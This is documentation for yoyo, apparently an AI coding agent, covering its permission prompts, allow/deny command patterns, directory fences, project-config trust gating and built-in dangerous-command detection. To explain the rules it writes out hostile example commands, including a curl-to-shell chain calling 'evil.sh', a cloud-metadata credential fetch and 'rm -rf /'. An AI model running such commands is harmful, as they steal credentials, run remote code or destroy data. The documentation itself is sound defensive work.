# Permissions & Safety

yoyo asks for confirmation before running tools that modify your system. This page covers how to control that behavior — from interactive prompts to fine-grained allow/deny rules.

## Interactive Permission Prompts

By default, yoyo prompts you before executing any potentially dangerous tool:

- **`bash`** — every shell command asks for `[y/N]` confirmation
- **`write_file`** — creating or overwriting files asks for approval
- **`edit_file`** — modifying existing files asks for approval
- **`rename_symbol`** — cross-file symbol renaming asks for approval

Read-only tools (`read_file`, `list_files`, `search`) and the `ask_user` tool run without prompting.

When a tool needs approval, you'll see something like:

```
⚡ bash: git status
  Allow? [y/N]
```

Type `y` to approve, or `n` (or just press Enter) to deny.

## Auto-Approve Everything: `--yes` / `-y`

If you trust the agent fully (e.g., in a sandboxed environment or CI pipeline), skip all prompts:

```bash
yoyo -y -p "refactor the auth module"
```

This auto-approves every tool call — bash commands, file writes, everything.

The one exception is your own `deny` list: a bash command matching a `--deny` pattern (or `.yoyo.toml` `[permissions] deny`) is still blocked under `--yes`, and still blocked after you answer `a` (always) at a prompt. It also applies to bash run by `sub_agent` and `explore_agent` children.

> ⚠️ **Use with caution.** This gives yoyo unrestricted access to your shell and filesystem.

## Command Filtering: `--allow` and `--deny`

For finer control over which bash commands run automatically, use glob patterns:

```bash
yoyo --allow "git *" --allow "cargo *" --deny "rm -rf *"
```

### How it works

1. **Deny is checked first.** If a command matches any `--deny` pattern, it's rejected immediately — the agent sees an error message and must try something else. For bash this holds on every approval path: under `--yes`, after an "always" answer, and for commands yoyo's safety analyzer would otherwise warn about. The pattern is matched against the whole command and also against each part of a compound command (split at `;`, `&&`, `||`, `|` and newlines, but never inside quotes), with leading `VAR=value` assignments and `export`/`declare`/`local` prefixes ignored, so `cd x && rm -rf build` and `TZ=UTC rm -rf build` both hit `rm -rf *`. When a deny list is set, a command whose program name comes from a shell expansion (`$VAR`, `$(...)` or backticks, e.g. `"$CARGO" build`) is refused, because the deny list cannot check a name it cannot see; write the command plainly instead. For the same reason, when a deny list is set, `eval` with a command substitution in its arguments (`eval "$(...)"` or backticks, also behind `VAR=` prefixes, `builtin` or `bash -c`) is refused: the command that would run is assembled at runtime, so no spelling check can judge it. One narrow exception: shell setup from a known env emitter is allowed when the eval's only argument is a single substitution holding one plain command (no `;`, `&&`, `|`, redirection, quotes, `$` or nested substitution), run by a bare program name (not a path like `./ssh-agent`) from this list, and that inner command itself passes your deny list: `ssh-agent` (any arguments), `direnv hook`/`direnv export`, `brew shellenv`, `pyenv init`, `rbenv init`, `nodenv init`, `zoxide init`, `starship init`, `fnm env`, `mise activate`. So `eval "$(ssh-agent -s)"` and `eval "$(direnv hook bash)"` run, while `eval "$(cat setup.sh)"` and `eval "$(brew install x)"` are refused; a deny pattern such as `ssh-agent*` refuses the eval too. The list trusts program names the same way the deny check does for every plain command, and an emitter missing from it is simply refused as before. For anything else, run the setup outside yoyo before starting it, or start the session without a deny list. With no deny list, none of this applies. Limit: this is spelling normalisation, not a shell interpreter, and a deny list over spellings is not a sandbox.
2. **Allow is checked second.** If a command matches any `--allow` pattern, it runs without prompting.
3. **No match = prompt.** Commands that don't match either list get the normal `[y/N]` prompt.

Patterns use simple glob matching where `*` matches any sequence of characters (including empty):

| Pattern | Matches | Doesn't match |
|---|---|---|
| `git *` | `git status`, `git commit -m "hello"` | `echo git`, `gitignore` |
| `*.rs` | `main.rs`, `src/main.rs` | `main.py` |
| `cargo * --release` | `cargo build --release` | `cargo build --debug` |
| `rm -rf *` | `rm -rf /`, `rm -rf /tmp` | `rm file.txt` |
| `*` | everything | — |

Glob matching is purely textual: `*` spans **any** characters, including shell operators like
`&&` and `|`. Three rules narrow what an **allow** pattern will auto-approve on top of that raw
match — see [option tokens](#a-wildcard-before-a-literal-does-not-swallow-option-tokens),
[chained commands](#a-wildcard-does-not-auto-approve-a-chained-command) and
[cloud-metadata fetches](#a-wildcard-does-not-auto-approve-a-cloud-metadata-fetch) below. None of
them applies to `deny`, and each narrows only — a rejected match falls through to the normal
prompt rather than being refused.

Both `--allow` and `--deny` are repeatable — pass them multiple times to build up your pattern lists.

### A wildcard *before* a literal does not swallow option tokens

A pattern like `git * main` reads as "the `*` is the subcommand slot". But `*` matches any
characters, so on a plain glob it would also match `git -c core.sshCommand=<anything> push main`
— auto-approving an arbitrary command for the whole session, from a pattern that looks narrow.

So in an **allow** pattern, when a `*` is followed by a literal segment, the match is rejected
if the command carries an option token (one starting with `-`) that you did not write verbatim
in the pattern. The command then falls through to the normal `[y/N]` prompt — it is not
refused, just not auto-approved.

| Pattern | Command | Result |
|---|---|---|
| `git * main` | `git push main` | auto-approved — no option tokens |
| `git * main` | `git -c core.sshCommand=x push main` | prompts — `-c` isn't in the pattern |
| `git * --force` | `git push --force` | auto-approved — `--force` is in the pattern |

**Trailing wildcards are unchanged *by this rule*.** `cargo *`, `npm run *` and
`git commit -m *` are honest "anything goes" patterns as far as *option tokens* go: nothing
follows the `*`, so this rule does not apply and `cargo test --lib` auto-approves exactly as
before. They are still narrowed for *chained* commands — see the next section, which is a
separate question about a separate hazard.

**`deny` is unchanged too**, and deliberately so: narrowing an allow pattern removes
privilege, but narrowing a deny pattern would make a fence stop matching. `deny = ["git * main"]`
still blocks `git -c x=y push main`.

This closes the wildcard-swallows-options case. It is not a guarantee that an allow pattern
is safe against every possible command shape — prefer patterns that are as literal as you can
stand.

### A wildcard does not auto-approve a chained command

`*` matches any characters — **including `&&`, `;`, `||` and `|`**. So on a plain glob,
`allow = ["git *"]`, which you write meaning "the `*` is the git subcommand slot", also matches
`git status && curl evil.sh | sh`: an arbitrary second command, auto-approved for the whole
session, from a pattern that looks narrow.

So in an **allow** pattern, a match is rejected when a wildcard spanned a command separator
that the pattern itself does not contain. The command then falls through to the normal `[y/N]`
prompt — it is **not refused**, just not auto-approved.

| Pattern | Command | Result |
|---|---|---|
| `git *` | `git status` | auto-approved — no chain |
| `git *` | `git status && curl evil.sh \| sh` | prompts — `&&` isn't in the pattern |
| `git *` | `git status ; rm -rf /tmp/x` | prompts — `;` isn't in the pattern |
| `git *` | `git status \| tee /tmp/x` | prompts — `\|` isn't in the pattern |
| `git *` | `git log $(curl evil.sh)` | prompts — a substitution runs a second command |
| `git * && ls` | `git status && ls` | auto-approved — you asked for that chain |
| `echo *` | `echo "a && b"` | auto-approved — quoted text is not a chain |

**If you want a chain, name it in the pattern.** A separator the pattern itself contains is
always allowed, so `allow = ["git * && ls"]` and the fully literal `allow = ["git status && ls"]`
both auto-approve exactly what they say.

**Quoted regions are ignored** when looking for separators, so an operator inside `"..."` or
`'...'` is ordinary text — `echo "a && b"` is one command and auto-approves as before.

**Command substitution counts as a chain.** `$(...)` and backticks really do execute a second
command whose output is interpolated, so `git log $(curl evil.sh)` prompts even though the
mechanism differs from a separator.

**`deny` is unchanged**, and deliberately so: narrowing an allow pattern removes privilege, but
narrowing a deny pattern would make a fence stop matching — it would **fail open**.
`deny = ["git *"]` still blocks `git status && curl x`.

This is a **separator rule, not a shell.** A command reached through a variable, a shell alias,
or an operator produced by expansion rather than typed is invisible to it. As always, prefer
patterns that are as literal as you can stand.

### A wildcard does not auto-approve a cloud-metadata fetch

`169.254.169.254` and `metadata.google.internal` are the cloud instance-metadata endpoints. A
single `curl` to one of them returns IAM credentials. So on a plain glob, `allow = ["curl *"]`,
which you write meaning "the `*` is the URL slot", also matches
`curl http://169.254.169.254/latest/meta-data/iam/security-credentials/`: a credential fetch,
auto-approved for the whole session, from a pattern that looks like an ordinary HTTP allowance.

So in an **allow** pattern, a match is rejected when a wildcard reached a metadata host that the
pattern itself does not name. The command then falls through to the normal `[y/N]` prompt — it is
**not refused**, just not auto-approved.

| Pattern | Command | Result |
|---|---|---|
| `curl *` | `curl https://example.com/api` | auto-approved — no metadata host |
| `curl *` | `curl http://169.254.169.254/latest/meta-data/` | prompts — AWS IMDS |
| `curl *` | `curl http://metadata.google.internal/computeMetadata/v1/` | prompts — GCP metadata |
| `cargo *` | `cargo test --lib` | auto-approved — no metadata host |
| `curl http://169.254.169.254/*` | the same IMDS fetch | auto-approved — the pattern names it |
| `curl *` (as **deny**) | the same IMDS fetch | blocked, as before |

**If you want the endpoint, name it in the pattern.** A host the pattern itself contains is
always allowed, so `allow = ["curl http://169.254.169.254/*"]` auto-approves exactly what it
says. A **wildcard-free** pattern is untouched entirely — a literal you typed in full is your own
word.

The hosts checked are the canonical ones: `169.254.169.254` (AWS EC2 IMDS, and the same
link-local address Azure, DigitalOcean and OpenStack use), `metadata.google.internal` and
`metadata.goog` (GCP), `169.254.170.2` (AWS ECS task metadata) and `100.100.100.200` (Alibaba
Cloud).

**Quoted regions are deliberately *not* ignored here**, unlike the chain rule above. Quoting a
URL is the normal way to write one — `curl "http://169.254.169.254/..."` — so skipping quoted
text would blind the check on the commonest shape. The cost is that a command merely *mentioning*
the address, such as `echo "169.254.169.254"`, also stops auto-approving. That is over-blocking,
which is the safe direction for an allow narrowing: the worst case is one confirmation prompt.

**`deny` is unchanged**, and deliberately so: narrowing an allow pattern removes privilege, but
narrowing a deny pattern would make a fence stop matching — it would **fail open**.
`deny = ["curl *"]` still blocks the metadata fetch.

This is a **host rule, not egress control.** If you approve the command it still runs, and the
endpoint stays reachable by any tool the model is allowed to invoke. A command built through a
variable, a shell alias, an IP written in decimal or octal form, or a redirect that resolves to
the metadata address is invisible to it.

### Deny overrides allow

If both an allow and deny pattern match the same command, **deny wins**:

```bash
# This allows all commands EXCEPT rm -rf
yoyo --allow "*" --deny "rm -rf *"
```

The command `rm -rf /tmp` matches `*` (allow) and `rm -rf *` (deny) — deny takes priority, so it's blocked.

## Directory Restrictions: `--allow-dir` and `--deny-dir`

Restrict which directories yoyo's file tools can access:

```bash
yoyo --allow-dir ./src --allow-dir ./tests --deny-dir ~/.ssh
```

This affects `read_file`, `write_file`, `edit_file`, `list_files`, and `search`. For `search` and `list_files` the
fence covers the results as well as the path you pass: searching or listing an allowed root still withholds every
match or file inside a refused directory, and the result ends with a line saying how many were withheld. The
tool's own count (`(N matches)` / `(N files)`) is then re-counted to the results actually shown, so it agrees with
that line. `list_files` also reports the warnings `find` printed (`find: '<path>': Permission denied`, under a
`Warnings from find` header, or as the whole error when nothing could be listed): a warning that names a path inside
a refused directory is withheld and counted in that same line, and the header goes too if no warning is left under
it. The count of files is not changed by this, because warnings were never part of it. The warnings block is
capped at 2000 characters, which can cut its last line partway through a path; while a fence is active that cut
line is withheld with its own note, because a path cut inside a refused directory's own name (`/home/u/.s` for
`--deny-dir ~/.ssh`) is not inside that directory and could not otherwise be told apart from a harmless one.
Your ripgrep config cannot reshape a fenced `search`: yoyo's `search` runs `rg` with `--no-config` and with
`RIPGREP_CONFIG_PATH` (and `GREP_OPTIONS`) removed from its environment (yoagent 0.25.5 and later), so there is
nothing to unset. As a second line of defence, while a fence is active any result line that does not name a file
under the searched path in the usual `path:line:` form (for example from an `rg` or `grep` wrapper on your `PATH`
that adds `--no-filename`, `--null`, `--json` or `--path-separator`) is dropped and counted in its own note.

The same fence applies to project instruction files (`YOYO.md`, `CLAUDE.md`, `AGENTS.md`, …) loaded into the
system prompt: a `CLAUDE.md` whose resolved target is denied (or outside every allowed directory) is not loaded,
and yoyo prints a warning naming it. The current goal (`.yoyo/goal.md`, set with `/goal set`) is fenced the same
way: if its resolved target is refused, it is left out of the system prompt and out of `/goal check`, with a
warning. Project memories (`.yoyo/memory.json`) get the same treatment: if the memory file's resolved target is
refused, no memories are added to the system prompt and yoyo prints a warning. (The REPL `/memories` and
`/remember` commands are not fenced yet. They show on your terminal or write to disk, and nothing they do is sent
to the model.)
Skill directories (`--skills <dir>`, `.yoyo/skills/`, `~/.yoyo/skills/` and the install dir) are fenced too: if
any skill's `SKILL.md` resolves to a refused location, that whole directory is not loaded (none of its skills are
offered to the model) and yoyo prints a warning naming the refused files. With `--allow-dir`, this includes your
user-level `~/.yoyo/skills/` when it lies outside every allowed directory, because `read_file` could not open those
skills anyway.
Files you name yourself (`@path` mentions, `/add`, `/explain`, `--image`) are fenced the same way: a file whose
resolved target is refused is not sent to the model, yoyo prints a warning naming it, and the rest of the prompt
still goes through.

### Ask before reading outside the launch directory

In an interactive session (stdin is a terminal), `read_file`, `search` and `list_files` ask first when the path (`read_file`) or the root (`search`, `list_files`) resolves (symlinks followed) to somewhere outside the directory you launched yoyo in. In a non-interactive run (`-p` in a pipe, CI, any script with no terminal) the fence is off by default and those tools can reach any path, exactly as before: turned on there it could only refuse, never ask. The environment variable `YOYO_ASK_OUTSIDE_READS` overrides the default for either kind of run:

```bash
YOYO_ASK_OUTSIDE_READS=0 yoyo            # never ask, even in a terminal
YOYO_ASK_OUTSIDE_READS=1 yoyo -p "..."   # fence on with no terminal: outside reads are refused
```

Only the exact values `1` and `0` are recognised; anything else (including unset) takes the default above.

- `/cd` does not move that anchor: launching in `~/project` and typing `/cd ~` does not make `~/.ssh` "inside". Navigating is not consent to read the new directory, so reads there ask (once per directory). Anything you already approved stays approved after `/cd`.
- If yoyo cannot tell where it was launched (the directory was deleted and the current directory cannot be read), it asks rather than allowing, and a relative path it cannot resolve is refused with a request for an absolute one.

- In a terminal, yoyo asks `y/n`. A yes covers that file's directory for the rest of the session, so three reads in `/etc` ask once. It does not cover subdirectories. A no refuses only that call, and the next call there asks again.
- A `search` or `list_files` rooted at an outside directory asks about that directory, and a yes covers later searches and listings rooted at exactly that directory (both tools walk into subdirectories, so the prompt says so). It does not cover a root one level down, and a yes for *reading* files in a directory does not cover a recursive search of it: reading `~/.bashrc` must not quietly grant a search that reaches `~/.ssh`. A root that is a file is treated like `read_file` of that file. No root means the current directory, and it is checked as that directory at the moment of the call: after `/cd ~`, a search or listing with no root asks about `~` (as a recursive search of it) instead of walking it. Without a `/cd` the current directory is the launch directory, so nothing is asked.
- With no terminal (for example `-p` in a pipe or CI) and `YOYO_ASK_OUTSIDE_READS=1`, the read is refused. The refusal names the path and tells the model how it can be allowed. Without that setting a run with no terminal is not fenced at all.
- A path that does not exist is not asked about. `read_file` reports its own error.
- With `--allow-dir` set, nothing is asked, because the directories you listed are your answer.

This fences the path argument of `read_file`, `search` and `list_files`, and it is not a sandbox. `bash` can still `cat` the same file, and writes (`write_file`, `edit_file`, `rename_symbol`) are not covered by it. For a hard boundary, use `--allow-dir` or `--restricted`.

### Rules

- If **`--allow-dir`** is set, *only* paths under allowed directories are accessible. Everything else is blocked.
- If **`--deny-dir`** is set, paths under denied directories are blocked.
- **Deny overrides allow** — if a path is under both an allowed and a denied directory, it's blocked.
- Paths are resolved to absolute paths before checking, so `../` traversal escapes are caught.
- Symlinks are followed before matching, both for the path being checked and for each
  `--allow-dir`/`--deny-dir` entry: an entry that is a symlink matches at its **target**,
  including a dangling link whose target does not exist yet (so `allow = ["./out"]` with
  `out -> /somewhere/else` allows `/somewhere/else`, not a directory inside your repo).
  A path caught in a symlink loop is refused.
- The repository map in the system prompt honours the same fence: a file under a
  `--deny-dir` (or outside every `--allow-dir`, symlinks resolved) is omitted before its
  symbols are read, and yoyo prints how many files were omitted (a count, never the names).
  The project file listing in the prompt can still *name* such files; their contents stay out.

### Example: lock yoyo to your project

```bash
yoyo --allow-dir . --deny-dir ./.git --deny-dir ~/.ssh
```

This lets yoyo read and write anywhere in the current project, but blocks access to `.git` internals and your SSH keys.

## Config File

Instead of passing flags every time, put your permission rules in `.yoyo.toml` (project-level), `~/.yoyo.toml` (home directory), or `~/.config/yoyo/config.toml` (XDG):

```toml
[permissions]
allow = ["git *", "cargo *", "echo *"]
deny = ["rm -rf *", "sudo *"]

[directories]
allow = ["./src", "./tests"]
deny = ["~/.ssh", "/etc"]
```

### Wildcards in `[directories]`

`[directories]` entries support `*` wildcards. An entry with **no** wildcard is
matched by prefix exactly as it always has been — the path itself, plus
everything beneath it. An entry that **contains** a `*` is matched as a path
pattern against each candidate path and its parent directories.

`*` matches any run of characters, **including `/`**, so a pattern covers
everything beneath whatever it matches:

```toml
[directories]
allow = ["src/*"]
deny = ["secrets/*"]
```

One worked example per direction:

- `allow = ["src/*"]` permits `src/main.rs` and `src/format/mod.rs`, and still
  refuses `/etc/passwd`.
- `deny = ["secrets/*"]` blocks `secrets/api/key.txt` and leaves `src/main.rs`
  alone.

Because `*` spans `/`, the wildcard does not have to be in the last component.
`deny = ["*/secrets"]` fences off every directory named `secrets` wherever it
sits — it blocks `a/secrets/key.txt` and `a/secrets` itself, while leaving
`a/public/x` alone.

> **`?` is not a wildcard here.** yoyo's glob matcher implements `*` and
> nothing else, so a `?` in either block is a literal question mark. Use `*`.

> **The two blocks glob different subjects.** `[permissions]` patterns are
> globbed against **commands** (`git *` matches `git status`); `[directories]`
> patterns are globbed against **paths**. Same `*`, different thing on the
> other side of it. yoyo prints one informational note at startup naming any
> `[directories]` entry that carries a wildcard, so you can confirm it was
> read as a pattern rather than as a literal path.

You do not need a wildcard to cover a subtree: naming the directory itself
(`src`, not `src/*`) already covers everything beneath it. Reach for a pattern
when the directory's *location* varies, as in the examples above.

### Precedence

CLI flags override config file values:
- If you pass any `--allow` or `--deny` flag, the entire `[permissions]` section from the config file is ignored.
- If you pass any `--allow-dir` or `--deny-dir` flag, the entire `[directories]` section from the config file is ignored.
- `--yes` / `-y` overrides everything — all tools are auto-approved regardless of permission patterns.

Config file search order (first found wins):
1. `.yoyo.toml` in the current directory
2. `~/.yoyo.toml` in your home directory
3. `~/.config/yoyo/config.toml`

## Persisting "Always" Approvals

When you answer "a" (always) to a confirmation prompt during a session, yoyo sets a session-wide auto-approve flag. It also offers to save the pattern to `.yoyo.toml` so the approval persists across sessions:

- **Bash commands**: yoyo simplifies the command into a glob (e.g., `cargo test*`) and asks if you'd like to save it.
- **File operations**: yoyo generates a directory-based pattern (e.g., `src/*` for files under `src/`, or `*.rs` for root-level Rust files) and offers to save it.

The save prompt only appears once per pattern per session — you won't be asked repeatedly for the same directory.

## Practical Examples

### Rust development — approve common tools

```bash
yoyo --allow "git *" --allow "cargo *" --allow "cat *" --allow "ls *"
```

Or in `.yoyo.toml`:

```toml
[permissions]
allow = ["git *", "cargo *", "cat *", "ls *", "echo *"]
deny = ["rm -rf *", "sudo *"]
```

### Sandboxed CI — trust everything

```bash
yoyo -y -p "run the test suite and fix any failures"
```

### Paranoid mode — restrict to source files only

```bash
yoyo --allow-dir ./src --allow-dir ./tests --deny "rm *" --deny "sudo *"
```

### Read-only exploration

```bash
yoyo --deny "*" --allow "cat *" --allow "ls *" --allow "grep *" --allow-dir .
```

This denies all bash commands except read-only ones, and restricts file access to the current directory.

## Built-in Command Safety Analysis

Beyond pattern matching, yoyo has a built-in safety analyzer that detects categories of dangerous commands and provides specific warnings. This runs automatically — you don't need to configure it.

**Detected patterns include:**

| Category | Examples |
|---|---|
| Filesystem destruction | `rm -rf /`, `rm -rf ~` |
| Force git operations | `git push --force`, `git reset --hard` |
| Permission changes | `chmod -R 777`, `chown -R` on system dirs |
| File overwrites | `> /etc/passwd`, `> ~/.bashrc` |
| System commands | `shutdown`, `reboot`, `halt` |
| Database destruction | `DROP TABLE`, `DROP DATABASE`, `TRUNCATE TABLE` |
| Pipe from internet | `curl ... \| bash`, `wget ... \| sh` |
| Process killing | `kill -9 1`, `killall` |
| Disk operations | `dd if=`, `fdisk`, `parted`, `mkfs` |

When a dangerous pattern is detected, yoyo shows a warning explaining **why** the command is flagged before asking for confirmation. A handful of truly catastrophic patterns (like `rm -rf /` or fork bombs) are hard-blocked and can never execute, even with `--yes`.

The hard block reads commands, not text: a quoted mention passes, whether it fits on one line (`echo "rm -rf /"`) or spans several (a `git commit -m "…"` or `gh issue comment --body "…"` whose body has the pattern on a line of its own). A newline outside quotes still starts a new command, and a script handed to `bash -c`/`sh -c`/`eval` is read as commands too. Two places are still read as commands even when they only mention a pattern, because that is the safe direction: a heredoc body (`cat <<EOF … EOF`) and anything containing `$(…)` or backticks. If one of those refuses text you meant as prose, write it to a file and pass the path (`git commit -F msg.txt`, `--body-file`). The block does not look inside other programs, so `python3 -c "…"` passes on one line or many.

When bash refuses a command (a hard block, your deny list, a sub-agent that would need your confirmation, a git redirection out of a pinned worktree, or you answering no), the model gets the refusal text exactly as written. yoyo does not add a "try a simpler version" recovery hint, and it does not re-run the whole prompt automatically, because running it again would hit the same refusal.

Safe commands like `ls`, `cargo test`, `git status`, and `grep` pass through without triggering any warnings.

## Project-local config is not trusted to start processes or grant approval

A `.yoyo.toml` sitting in the directory you launch yoyo from ships with the *repository*, not
with you. It can name arbitrary local commands under `mcp = [...]` or `[mcp_servers.*]`, and
before yoyo would start them during normal startup — no prompt, no display of what was about
to run. It can also widen what bash commands run without asking, via `[permissions] allow`.

Since issue #748, **MCP servers declared by a project-local `.yoyo.toml` are not started by
default.** When yoyo drops them it prints one block on stderr naming the resolved command of
each server it refused, so you can see exactly what the repo proposed:

```
⚠ A project-local .yoyo.toml asked to start 1 MCP server. yoyo did not start it:
    npx -y @some/mcp-server
  This config came with the project, not from you. Re-run with --trust-project to start them,
  or use --safe-mode to disable all project customizations.
```

Since issue #749, **`[permissions] allow` patterns declared by a project-local `.yoyo.toml`
are not applied either.** Those patterns *grant* auto-approval — a repo shipping
`allow = ["curl *"]` would otherwise make those commands run without ever asking you, and the
effect is invisible until a command silently executes. The refusal is announced the same way,
naming every pattern it dropped:

```
⚠ A project-local .yoyo.toml asked to auto-approve 2 bash command patterns. yoyo did not apply them:
    curl *
    rm *
  This config came with the project, not from you. Re-run with --trust-project to apply them,
  or use --safe-mode to disable all project customizations.
  Its deny patterns and directory restrictions are still in force — those only reduce access.
```

Since Day 184, **a `notify_command` declared by a project-local `.yoyo.toml` is not installed
either.** That key is handed to `sh -c` (`cmd /C` on Windows) when a prompt finishes, so its
entire content is executable code — the same test that gates shell hooks. Note that
`--no-notify` does **not** cover it: that flag gates the desktop-notification branch, not the
command. The refusal names the command verbatim, in the shape it has in the file:

```
⚠ A project-local .yoyo.toml asked to run a shell command when a prompt finishes. yoyo did not run it:
    notify_command = touch /tmp/pwned
  This config came with the project, not from you. Nothing was executed.
  Re-run with --trust-project to run it this session, or use --safe-mode to disable
  all project customizations.
```

To opt in for that run:

```bash
yoyo --trust-project
```

### Remembering a directory you trust

`--trust-project` applies to **one run**. If you genuinely trust a repository you would
otherwise retype it on every invocation, which is the pressure that turns into a shell alias —
i.e. back to the unsafe default, by habit. `--trust-project-always` does the same thing for
this run *and* records the directory so later runs there need no flag:

```bash
yoyo --trust-project-always
```

```
✓ Trusting this directory from now on: /home/me/proj
  Recorded in /home/me/.config/yoyo/trusted_dirs. Remove that line to revoke.
  Project-local .yoyo.toml MCP servers, permissions.allow and shell hooks will run here without a flag.
```

The store is a plain text file, one absolute directory path per line, at
`$XDG_CONFIG_HOME/yoyo/trusted_dirs` (or `~/.config/yoyo/trusted_dirs`). Four properties are
worth knowing before you use it:

- **It is user-level, never project-level.** yoyo does not look for a `trusted_dirs` file
  inside the repository, so a repository can never trust itself — the same reason a
  project-local `.yoyo.toml` cannot grant its own MCP servers permission to start.
- **Exact directory match only — there is no subdirectory inheritance.** Trusting
  `/home/me/proj` does not trust `/home/me/proj/vendor/anything`, and does not trust
  `/home/me/proj-other`. Each directory you want trusted has to be recorded on its own.
- **Paths are stored canonicalized**, so `.`, `..` and a symlinked checkout cannot present as
  a path different from the one you trusted. If the directory cannot be resolved to a real
  path, yoyo refuses rather than falling back to the raw string — "could not check" must not
  read as "trusted".
- **Every run that is trusted by the store says so.** You should never discover that a
  project's MCP servers, `[permissions] allow` and shell hooks are live because of a decision
  you made weeks ago and cannot see:

```
⚠ This directory is trusted by a previous --trust-project-always: /home/me/proj
  Listed in /home/me/.config/yoyo/trusted_dirs; remove that line to revoke.
  Project-local .yoyo.toml MCP servers, permissions.allow and shell hooks are live this run.
```

There is deliberately **no un-trust flag**: revoking is deleting the line from that file, and
both messages above name its full path so you can find it. Both are informational stderr
output — they are silent under `--quiet` and print without glyphs under `--screen-reader`.

### Only privilege-*granting* fields, and fields that *are* executable code, are gated

The gate is not a symmetric distrust of everything the project says about permissions. Each
field is sorted by which direction it moves privilege, and only the granting one is refused:

| Field from a project-local config | Direction | Decision |
|---|---|---|
| `[permissions] allow` | **Grants** privilege — auto-approves bash commands | **Refused** unless `--trust-project` |
| `notify_command` | **Is** executable code — handed to `sh -c` when a prompt finishes | **Refused** unless `--trust-project` |
| `[permissions] deny` | Reduces privilege — always blocks | Kept verbatim |
| `[directories] allow` (`dir_restrictions.allow`) | Reduces privilege — the default is unrestricted, so an allow-list can only narrow | Kept verbatim |
| `[directories] deny` (`dir_restrictions.deny`) | Reduces privilege | Kept verbatim |

Refusing a project's `deny` or directory restrictions would make yoyo **less** confined than
the repo asked for — that would be a regression dressed as a security fix. A repo is always
allowed to restrict yoyo further; it is not allowed to loosen it.

The boundary is deliberately narrow:

| Source | Started / applied by default? |
|---|---|
| `--mcp <command>`, `--allow`, `--deny` typed on the command line | Yes — you typed it |
| `~/.yoyo.toml` or the XDG config | Yes — you authored it |
| `./.yoyo.toml` in the working directory — MCP servers, `[permissions] allow`, shell hooks and `notify_command` | **No** — needs `--trust-project`, or this exact directory recorded by `--trust-project-always` |
| `./.yoyo.toml` — `[permissions] deny` and `[directories]` | Yes — they only reduce access |
| Any of the above under `--safe-mode` | No — safe mode disables all customizations |

If your cwd *is* your home directory, `~/.yoyo.toml` reached as `./.yoyo.toml` still counts as
your own config and is not gated.

**What this does not cover yet.** There is no interactive "do you trust this folder?" prompt —
trust is granted by a flag you type, never by a question yoyo asks, so in a script or a
non-interactive run the answer is always the safe one. Recording a directory is therefore
something you do on purpose with `--trust-project-always`, and it applies to that exact
directory only. Use `--safe-mode` if you want none of a project's config applied. The prompt
is tracked in issue #749.

## Summary

| Mechanism | Scope | Effect |
|---|---|---|
| Default prompts | All modifying tools | Ask `[y/N]` before each call |
| `--yes` / `-y` | Everything | Auto-approve all tools |
| `--allow <pattern>` | Bash commands | Auto-approve matching commands |
| `--deny <pattern>` | Bash commands | Auto-reject matching commands |
| `--allow-dir <dir>` | File tools | Only allow paths under these dirs |
| `--deny-dir <dir>` | File tools | Block paths under these dirs |
| `[permissions]` in config | Bash commands | Same as `--allow`/`--deny` (project-local `allow` needs `--trust-project`) |
| `[directories]` in config | File tools | Same as `--allow-dir`/`--deny-dir` |
| "Always" persistence | Bash + file tools | Offers to save patterns to `.yoyo.toml` on "always" |
| Project-config trust | MCP servers and `[permissions] allow` from `./.yoyo.toml` | Not started/applied unless `--trust-project`, or the directory was recorded by `--trust-project-always` |
| `--trust-project-always` | This directory | Records the canonicalized cwd in `~/.config/yoyo/trusted_dirs`; exact match only, no subdirectory inheritance; revoke by deleting the line |

> **Tip:** Use `/permissions` during a session to see the full security posture — auto-approve status, command patterns, and directory restrictions all in one view.

## After `/cd`

`/cd` applies three parts of the new directory's `.yoyo.toml`, all of which only narrow what yoyo may do:

- its `[permissions] deny` patterns are added to the session's deny list and enforced on bash commands (the agent's and sub-agents'). File tools never read them.
- its `[directories] deny` entries are refused by the file tools (the agent's and sub-agents') and by the doors that put a file you name into your prompt: `@path` mentions, `/add`, `/explain` and `--image`, and by `/goal check` when it reads the goal file. A refusal from these doors ends with `(a [directories] entry applied by /cd)`, so you can tell it from a startup `--deny-dir` refusal. A relative entry such as `secrets` is resolved against the directory you `/cd`'d into, at that moment, so it keeps meaning `<that dir>/secrets` after a later `/cd`. They apply even when `--allow-dir`/`--deny-dir` was given at startup, and bash never reads them.
- its `[directories] allow` entries become a second fence for the same file tools and doors: a path must be inside one of them **and** pass the startup `--allow-dir` list, and unlike the deny lists this one is replaced by the next `/cd` (a directory without it removes it), because two unrelated projects' allow lists would together refuse almost everything.

`/permissions` lists them all: each `/cd`-added entry appears under the matching deny heading, labelled `(a deny entry applied by /cd)` or `(a [directories] entry applied by /cd)`, and each `/cd` allow entry appears under `Allowed directories`, labelled `(an allow entry applied by /cd; also required, replaced by the next /cd)`.

`/cd` also narrows the **launch** project's own grants. If you started yoyo in a trusted project whose `.yoyo.toml` has `[permissions] allow = ["cargo *"]`, those patterns were written for that project's tree. Once you `/cd` outside it, they stop auto-approving: `cargo build` in the other directory asks first, `/cd` prints a line naming the suspended patterns, and `/permissions` lists them under `Suspended allow patterns` instead of `Allow patterns`. Two exceptions: a pattern your own config (`~/.yoyo.toml` or `~/.config/yoyo/config.toml`) also lists keeps applying, and `--allow` flags are never suspended, because both are yours rather than the project's. `/cd` back into the launch directory, or any directory below it, and they apply again.

The deny lists last for the rest of the session and only grow: `/cd`-ing back does not remove anything. Everything else in the new directory's config (`[permissions] allow`, hooks, MCP servers, skills) is still **not** reloaded. yoyo prints a warning naming the `.yoyo.toml` parts it skipped (`[permissions] allow`, hooks, MCP servers). It does not mention a `.yoyo/skills/` directory, which is not loaded either. Restart yoyo in that directory to use them (#1040).

What `/cd` does with the four settings that would widen what yoyo may do, whether or not the new directory is in your trust store (`trusted_dirs`):

| Setting in the new directory | Untrusted | Trusted | Why |
|---|---|---|---|
| hooks (`hooks.pre.*`, `hooks.post.*`, ...) | not applied | not applied | Untrusted: a hook runs a command the project wrote, a mid-session `/cd` gives you no moment to consent, and startup refuses it for an untrusted project. Trusted: you have consented, but this version cannot load it mid-session (#1040). Restart yoyo there. |
| `[permissions] allow` | not applied | not applied | Untrusted: it would run commands without asking you. Startup refuses it for an untrusted project. Trusted: not loaded mid-session in this version (#1040). |
| MCP servers | not started | not started | Untrusted: a server is a program the project chose, and startup refuses it for an untrusted project. Trusted: not started mid-session in this version (#1040). |
| `.yoyo/skills/` | not loaded | not loaded | Untrusted: a skill puts instructions the project wrote into the model's context. Startup refuses it for an untrusted project. Trusted: not loaded mid-session in this version (#1040). |

